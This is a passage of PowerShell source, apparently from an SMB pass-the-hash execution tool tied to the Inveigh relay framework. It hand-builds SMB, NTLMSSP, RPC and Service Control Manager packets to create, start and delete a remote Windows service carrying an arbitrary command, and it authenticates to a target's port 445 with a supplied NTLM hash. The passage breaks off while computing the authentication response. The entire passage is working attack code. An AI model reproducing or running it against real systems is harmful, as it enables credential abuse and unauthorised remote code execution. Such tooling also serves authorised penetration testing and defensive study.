    param ([Byte[]]$FileID)

    $SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2ReadRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $SMB2ReadRequest.Add("Padding",[Byte[]](0x50))
    $SMB2ReadRequest.Add("Flags",[Byte[]](0x00))
    $SMB2ReadRequest.Add("Length",[Byte[]](0x00,0x00,0x10,0x00))
    $SMB2ReadRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("FileID",$FileID)
    $SMB2ReadRequest.Add("MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("ReadChannelInfoOffset",[Byte[]](0x00,0x00))
    $SMB2ReadRequest.Add("ReadChannelInfoLength",[Byte[]](0x00,0x00))
    $SMB2ReadRequest.Add("Buffer",[Byte[]](0x30))

    return $SMB2ReadRequest
}

function New-PacketSMB2WriteRequest
{
    param([Byte[]]$FileID,[Int]$RPCLength)

    [Byte[]]$write_length = [System.BitConverter]::GetBytes($RPCLength)

    $SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2WriteRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $SMB2WriteRequest.Add("DataOffset",[Byte[]](0x70,0x00))
    $SMB2WriteRequest.Add("Length",$write_length)
    $SMB2WriteRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("FileID",$FileID)
    $SMB2WriteRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("WriteChannelInfoOffset",[Byte[]](0x00,0x00))
    $SMB2WriteRequest.Add("WriteChannelInfoLength",[Byte[]](0x00,0x00))
    $SMB2WriteRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))

    return $SMB2WriteRequest
}

function New-PacketSMB2CloseRequest
{
    param ([Byte[]]$FileID)

    $SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2CloseRequest.Add("StructureSize",[Byte[]](0x18,0x00))
    $SMB2CloseRequest.Add("Flags",[Byte[]](0x00,0x00))
    $SMB2CloseRequest.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CloseRequest.Add("FileID",$FileID)

    return $SMB2CloseRequest
}

function New-PacketSMB2TreeDisconnectRequest
{
    $SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2TreeDisconnectRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $SMB2TreeDisconnectRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2TreeDisconnectRequest
}

function New-PacketSMB2SessionLogoffRequest
{
    $SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SessionLogoffRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $SMB2SessionLogoffRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2SessionLogoffRequest
}

#NTLM

function New-PacketNTLMSSPNegotiate
{
    param([Byte[]]$NegotiateFlags,[Byte[]]$Version)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($Version.Length + 32))[0]
    [Byte[]]$ASN_length_1 = $NTLMSSP_length[0] + 32
    [Byte[]]$ASN_length_2 = $NTLMSSP_length[0] + 22
    [Byte[]]$ASN_length_3 = $NTLMSSP_length[0] + 20
    [Byte[]]$ASN_length_4 = $NTLMSSP_length[0] + 2

    $NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
    $NTLMSSPNegotiate.Add("InitialContextTokenID",[Byte[]](0x60))
    $NTLMSSPNegotiate.Add("InitialcontextTokenLength",$ASN_length_1)
    $NTLMSSPNegotiate.Add("ThisMechID",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("ThisMechLength",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
    $NTLMSSPNegotiate.Add("InnerContextTokenID",[Byte[]](0xa0))
    $NTLMSSPNegotiate.Add("InnerContextTokenLength",$ASN_length_2)
    $NTLMSSPNegotiate.Add("InnerContextTokenID2",[Byte[]](0x30))
    $NTLMSSPNegotiate.Add("InnerContextTokenLength2",$ASN_length_3)
    $NTLMSSPNegotiate.Add("MechTypesID",[Byte[]](0xa0))
    $NTLMSSPNegotiate.Add("MechTypesLength",[Byte[]](0x0e))
    $NTLMSSPNegotiate.Add("MechTypesID2",[Byte[]](0x30))
    $NTLMSSPNegotiate.Add("MechTypesLength2",[Byte[]](0x0c))
    $NTLMSSPNegotiate.Add("MechTypesID3",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("MechTypesLength3",[Byte[]](0x0a))
    $NTLMSSPNegotiate.Add("MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
    $NTLMSSPNegotiate.Add("MechTokenID",[Byte[]](0xa2))
    $NTLMSSPNegotiate.Add("MechTokenLength",$ASN_length_4)
    $NTLMSSPNegotiate.Add("NTLMSSPID",[Byte[]](0x04))
    $NTLMSSPNegotiate.Add("NTLMSSPLength",$NTLMSSP_length)
    $NTLMSSPNegotiate.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
    $NTLMSSPNegotiate.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
    $NTLMSSPNegotiate.Add("NegotiateFlags",$NegotiateFlags)
    $NTLMSSPNegotiate.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $NTLMSSPNegotiate.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    if($Version)
    {
        $NTLMSSPNegotiate.Add("Version",$Version)
    }

    return $NTLMSSPNegotiate
}

function New-PacketNTLMSSPAuth
{
    param([Byte[]]$NTLMResponse)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($NTLMResponse.Length))[1,0]
    [Byte[]]$ASN_length_1 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 12))[1,0]
    [Byte[]]$ASN_length_2 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 8))[1,0]
    [Byte[]]$ASN_length_3 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 4))[1,0]

    $NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
    $NTLMSSPAuth.Add("ASNID",[Byte[]](0xa1,0x82))
    $NTLMSSPAuth.Add("ASNLength",$ASN_length_1)
    $NTLMSSPAuth.Add("ASNID2",[Byte[]](0x30,0x82))
    $NTLMSSPAuth.Add("ASNLength2",$ASN_length_2)
    $NTLMSSPAuth.Add("ASNID3",[Byte[]](0xa2,0x82))
    $NTLMSSPAuth.Add("ASNLength3",$ASN_length_3)
    $NTLMSSPAuth.Add("NTLMSSPID",[Byte[]](0x04,0x82))
    $NTLMSSPAuth.Add("NTLMSSPLength",$NTLMSSP_length)
    $NTLMSSPAuth.Add("NTLMResponse",$NTLMResponse)

    return $NTLMSSPAuth
}

#RPC

function New-PacketRPCBind
{
    param([Byte[]]$FragLength,[Int]$CallID,[Byte[]]$NumCtxItems,[Byte[]]$ContextID,[Byte[]]$UUID,[Byte[]]$UUIDVersion)

    [Byte[]]$call_ID = [System.BitConverter]::GetBytes($CallID)

    $RPCBind = New-Object System.Collections.Specialized.OrderedDictionary
    $RPCBind.Add("Version",[Byte[]](0x05))
    $RPCBind.Add("VersionMinor",[Byte[]](0x00))
    $RPCBind.Add("PacketType",[Byte[]](0x0b))
    $RPCBind.Add("PacketFlags",[Byte[]](0x03))
    $RPCBind.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $RPCBind.Add("FragLength",$FragLength)
    $RPCBind.Add("AuthLength",[Byte[]](0x00,0x00))
    $RPCBind.Add("CallID",$call_ID)
    $RPCBind.Add("MaxXmitFrag",[Byte[]](0xb8,0x10))
    $RPCBind.Add("MaxRecvFrag",[Byte[]](0xb8,0x10))
    $RPCBind.Add("AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))
    $RPCBind.Add("NumCtxItems",$NumCtxItems)
    $RPCBind.Add("Unknown",[Byte[]](0x00,0x00,0x00))
    $RPCBind.Add("ContextID",$ContextID)
    $RPCBind.Add("NumTransItems",[Byte[]](0x01))
    $RPCBind.Add("Unknown2",[Byte[]](0x00))
    $RPCBind.Add("Interface",$UUID)
    $RPCBind.Add("InterfaceVer",$UUIDVersion)
    $RPCBind.Add("InterfaceVerMinor",[Byte[]](0x00,0x00))
    $RPCBind.Add("TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
    $RPCBind.Add("TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

    if($NumCtxItems[0] -eq 2)
    {
        $RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
        $RPCBind.Add("NumTransItems2",[Byte[]](0x01))
        $RPCBind.Add("Unknown3",[Byte[]](0x00))
        $RPCBind.Add("Interface2",$UUID)
        $RPCBind.Add("InterfaceVer2",$UUIDVersion)
        $RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
        $RPCBind.Add("TransferSyntax2",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
    }
    elseif($NumCtxItems[0] -eq 3)
    {
        $RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
        $RPCBind.Add("NumTransItems2",[Byte[]](0x01))
        $RPCBind.Add("Unknown3",[Byte[]](0x00))
        $RPCBind.Add("Interface2",$UUID)
        $RPCBind.Add("InterfaceVer2",$UUIDVersion)
        $RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
        $RPCBind.Add("TransferSyntax2",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
        $RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
        $RPCBind.Add("ContextID3",[Byte[]](0x02,0x00))
        $RPCBind.Add("NumTransItems3",[Byte[]](0x01))
        $RPCBind.Add("Unknown4",[Byte[]](0x00))
        $RPCBind.Add("Interface3",$UUID)
        $RPCBind.Add("InterfaceVer3",$UUIDVersion)
        $RPCBind.Add("InterfaceVerMinor3",[Byte[]](0x00,0x00))
        $RPCBind.Add("TransferSyntax3",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $RPCBind.Add("TransferSyntaxVer3",[Byte[]](0x01,0x00,0x00,0x00))
    }

    if($call_ID -eq 3)
    {
        $RPCBind.Add("AuthType",[Byte[]](0x0a))
        $RPCBind.Add("AuthLevel",[Byte[]](0x02))
        $RPCBind.Add("AuthPadLength",[Byte[]](0x00))
        $RPCBind.Add("AuthReserved",[Byte[]](0x00))
        $RPCBind.Add("ContextID3",[Byte[]](0x00,0x00,0x00,0x00))
        $RPCBind.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $RPCBind.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $RPCBind.Add("NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
        $RPCBind.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $RPCBind.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $RPCBind.Add("OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }

    return $RPCBind
}

function New-PacketRPCRequest
{
    param([Byte[]]$Flags,[Int]$ServiceLength,[Int]$AuthLength,[Int]$AuthPadding,[Byte[]]$CallID,[Byte[]]$ContextID,[Byte[]]$Opnum,[Byte[]]$Data)

    if($AuthLength -gt 0)
    {
        $full_auth_length = $AuthLength + $AuthPadding + 8
    }

    [Byte[]]$write_length = [System.BitConverter]::GetBytes($ServiceLength + 24 + $full_auth_length + $Data.Length)
    [Byte[]]$frag_length = $write_length[0,1]
    [Byte[]]$alloc_hint = [System.BitConverter]::GetBytes($ServiceLength + $Data.Length)
    [Byte[]]$auth_length = ([System.BitConverter]::GetBytes($AuthLength))[0,1]

    $RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $RPCRequest.Add("Version",[Byte[]](0x05))
    $RPCRequest.Add("VersionMinor",[Byte[]](0x00))
    $RPCRequest.Add("PacketType",[Byte[]](0x00))
    $RPCRequest.Add("PacketFlags",$Flags)
    $RPCRequest.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $RPCRequest.Add("FragLength",$frag_length)
    $RPCRequest.Add("AuthLength",$auth_length)
    $RPCRequest.Add("CallID",$CallID)
    $RPCRequest.Add("AllocHint",$alloc_hint)
    $RPCRequest.Add("ContextID",$ContextID)
    $RPCRequest.Add("Opnum",$Opnum)

    if($data.Length)
    {
        $RPCRequest.Add("Data",$Data)
    }

    return $RPCRequest
}

#SCM

function New-PacketSCMOpenSCManagerW
{
    param ([Byte[]]$packet_service,[Byte[]]$packet_service_length)

    $packet_referent_ID1 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
    $packet_referent_ID1 = $packet_referent_ID1.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $packet_referent_ID1 += 0x00,0x00
    $packet_referent_ID2 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
    $packet_referent_ID2 = $packet_referent_ID2.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $packet_referent_ID2 += 0x00,0x00

    $packet_SCMOpenSCManagerW = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SCMOpenSCManagerW.Add("MachineName_ReferentID",$packet_referent_ID1)
    $packet_SCMOpenSCManagerW.Add("MachineName_MaxCount",$packet_service_length)
    $packet_SCMOpenSCManagerW.Add("MachineName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add("MachineName_ActualCount",$packet_service_length)
    $packet_SCMOpenSCManagerW.Add("MachineName",$packet_service)
    $packet_SCMOpenSCManagerW.Add("Database_ReferentID",$packet_referent_ID2)
    $packet_SCMOpenSCManagerW.Add("Database_NameMaxCount",[Byte[]](0x0f,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add("Database_NameOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add("Database_NameActualCount",[Byte[]](0x0f,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add("Database",[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add("Unknown",[Byte[]](0xbf,0xbf))
    $packet_SCMOpenSCManagerW.Add("AccessMask",[Byte[]](0x3f,0x00,0x00,0x00))
    
    return $packet_SCMOpenSCManagerW
}

function New-PacketSCMCreateServiceW
{
    param([Byte[]]$ContextHandle,[Byte[]]$Service,[Byte[]]$ServiceLength,[Byte[]]$Command,[Byte[]]$CommandLength)
                
    $referent_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
    $referent_ID = $referent_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $referent_ID += 0x00,0x00

    $SCMCreateServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $SCMCreateServiceW.Add("ContextHandle",$ContextHandle)
    $SCMCreateServiceW.Add("ServiceName_MaxCount",$ServiceLength)
    $SCMCreateServiceW.Add("ServiceName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("ServiceName_ActualCount",$ServiceLength)
    $SCMCreateServiceW.Add("ServiceName",$Service)
    $SCMCreateServiceW.Add("DisplayName_ReferentID",$referent_ID)
    $SCMCreateServiceW.Add("DisplayName_MaxCount",$ServiceLength)
    $SCMCreateServiceW.Add("DisplayName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("DisplayName_ActualCount",$ServiceLength)
    $SCMCreateServiceW.Add("DisplayName",$Service)
    $SCMCreateServiceW.Add("AccessMask",[Byte[]](0xff,0x01,0x0f,0x00))
    $SCMCreateServiceW.Add("ServiceType",[Byte[]](0x10,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("ServiceStartType",[Byte[]](0x03,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("ServiceErrorControl",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("BinaryPathName_MaxCount",$CommandLength)
    $SCMCreateServiceW.Add("BinaryPathName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("BinaryPathName_ActualCount",$CommandLength)
    $SCMCreateServiceW.Add("BinaryPathName",$Command)
    $SCMCreateServiceW.Add("NULLPointer",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("TagID",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("NULLPointer2",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("DependSize",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("NULLPointer3",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("NULLPointer4",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("PasswordSize",[Byte[]](0x00,0x00,0x00,0x00))

    return $SCMCreateServiceW
}

function New-PacketSCMStartServiceW
{
    param([Byte[]]$ContextHandle)

    $SCMStartServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $SCMStartServiceW.Add("ContextHandle",$ContextHandle)
    $SCMStartServiceW.Add("Unknown",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $SCMStartServiceW
}

function New-PacketSCMDeleteServiceW
{
    param([Byte[]]$ContextHandle)

    $SCMDeleteServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $SCMDeleteServiceW.Add("ContextHandle",$ContextHandle)

    return $SCMDeleteServiceW
}

function New-PacketSCMCloseServiceHandle
{
    param([Byte[]]$ContextHandle)

    $SCM_CloseServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $SCM_CloseServiceW.Add("ContextHandle",$ContextHandle)

    return $SCM_CloseServiceW
}

function Get-StatusPending
{
    param ([Byte[]]$Status)

    if([System.BitConverter]::ToString($Status) -eq '03-01-00-00')
    {
        $status_pending = $true
    }

    return $status_pending
}

function Get-UInt16DataLength
{
    param ([Int]$Start,[Byte[]]$Data)

    $data_length = [System.BitConverter]::ToUInt16($Data[$Start..($Start + 1)],0)

    return $data_length
}

if($hash -like "*:*")
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}

if($Domain)
{
    $output_username = $Domain + "\" + $Username
}
else
{
    $output_username = $Username
}

if($PSBoundParameters.ContainsKey('Session'))
{
    $inveigh_session = $true
}

if($PSBoundParameters.ContainsKey('Session'))
{

    if(!$Inveigh)
    {
        Write-Output "[-] Inveigh Relay session not found"
        $startup_error = $true
    }
    elseif(!$inveigh.session_socket_table[$session].Connected)
    {
        Write-Output "[-] Inveigh Relay session not connected"
        $startup_error = $true
    }

    $Target = $inveigh.session_socket_table[$session].Client.RemoteEndpoint.Address.IPaddressToString
}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
[Byte[]]$process_ID = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

if(!$inveigh_session)
{
    $client = New-Object System.Net.Sockets.TCPClient
    $client.Client.ReceiveTimeout = 60000
}

if(!$startup_error -and !$inveigh_session)
{

    try
    {
        $client.Connect($Target,"445")
    }
    catch
    {
        Write-Output "[-] $Target did not respond"
    }

}

if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$session].Connected))
{
    $client_receive = New-Object System.Byte[] 1024

    if(!$inveigh_session)
    {
        $client_stream = $client.GetStream()

        if($SMB_version -eq 'SMB2.1')
        {
            $stage = 'NegotiateSMB2'
        }
        else
        {
            $stage = 'NegotiateSMB'
        }

        while($stage -ne 'Exit')
        {

            try
            {

                switch ($stage)
                {

                    'NegotiateSMB'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID 0x00,0x00
                        $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        try
                        {    
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                            if([System.BitConverter]::ToString($client_receive[4..7]) -eq 'ff-53-4d-42')
                            {
                                $SMB_version = 'SMB1'
                                $stage = 'NTLMSSPNegotiate'

                                if([System.BitConverter]::ToString($client_receive[39]) -eq '0f')
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is required on $target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {
                                        Write-Verbose "[+] SMB signing is required"
                                        $SMB_signing = $true
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x15,0x82,0x08,0xa0
                                    }

                                }
                                else
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is not required on $target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {
                                        $SMB_signing = $false
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x05,0x82,0x08,0xa0
                                    }

                                }

                            }
                            else
                            {
                                $stage = 'NegotiateSMB2'

                                if([System.BitConverter]::ToString($client_receive[70]) -eq '03')
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is required on $target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {

                                        if($signing_check)
                                        {
                                            Write-Verbose "[+] SMB signing is required"
                                        }

                                        $SMB_signing = $true
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x15,0x82,0x08,0xa0
                                    }

                                }
                                else
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is not required on $target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {
                                        $SMB_signing = $false
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x05,0x80,0x08,0xa0
                                    }

                                }

                            }

                        }
                        catch
                        {

                            if($_.Exception.Message -like 'Exception calling "Read" with "3" argument(s): "Unable to read data from the transport connection: An existing connection was forcibly closed by the remote host."')
                            {
                                Write-Output "[-] SMB1 negotiation failed"
                                $negoitiation_failed = $true
                                $stage = 'Exit'
                            }

                        }

                    }

                    'NegotiateSMB2'
                    {

                        if($SMB_version -eq 'SMB2.1')
                        {
                            $message_ID = 0
                        }
                        else
                        {
                            $message_ID = 1
                        }

                        $tree_ID = 0x00,0x00,0x00,0x00
                        $session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                        $packet_SMB2_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2NegotiateProtocolRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'NTLMSSPNegotiate'

                        if([System.BitConverter]::ToString($client_receive[70]) -eq '03')
                        {

                            if($signing_check)
                            {
                                Write-Output "[+] SMB signing is required on $target"
                                $stage = 'Exit'
                            }
                            else
                            {

                                if($signing_check)
                                {
                                    Write-Verbose "[+] SMB signing is required"
                                }

                                $SMB_signing = $true
                                $session_key_length = 0x00,0x00
                                $negotiate_flags = 0x15,0x82,0x08,0xa0
                            }

                        }
                        else
                        {

                            if($signing_check)
                            {
                                Write-Output "[+] SMB signing is not required on $target"
                                $stage = 'Exit'
                            }
                            else
                            {
                                $SMB_signing = $false
                                $session_key_length = 0x00,0x00
                                $negotiate_flags = 0x05,0x80,0x08,0xa0
                            }

                        }

                    }

                    'NTLMSSPNegotiate'
                    {

                        if($SMB_version -eq 'SMB1')
                        {
                            $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID 0x00,0x00

                            if($SMB_signing)
                            {
                                $packet_SMB_header["Flags2"] = 0x05,0x48
                            }

                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                            $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        }
                        else
                        {
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                            $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        }

                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()    
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Exit'
                    }
                    
                }

            }
            catch
            {
                Write-Output "[-] $($_.Exception.Message)"
                $negoitiation_failed = $true
            }

        }

        if(!$signing_check -and !$negoitiation_failed)
        {
            $NTLMSSP = [System.BitConverter]::ToString($client_receive)
            $NTLMSSP = $NTLMSSP -replace "-",""
            $NTLMSSP_index = $NTLMSSP.IndexOf("4E544C4D53535000")
            $NTLMSSP_bytes_index = $NTLMSSP_index / 2
            $domain_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 12) $client_receive
            $target_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 40) $client_receive
            $session_ID = $client_receive[44..51]
            $NTLM_challenge = $client_receive[($NTLMSSP_bytes_index + 24)..($NTLMSSP_bytes_index + 31)]
            $target_details = $client_receive[($NTLMSSP_bytes_index + 56 + $domain_length)..($NTLMSSP_bytes_index + 55 + $domain_length + $target_length)]
            $target_time_bytes = $target_details[($target_details.Length - 12)..($target_details.Length - 5)]
            $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
            $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $auth_hostname = (Get-ChildItem -path env:computername).Value
            $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
            $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($Domain)
            $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
            $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)[0,1]
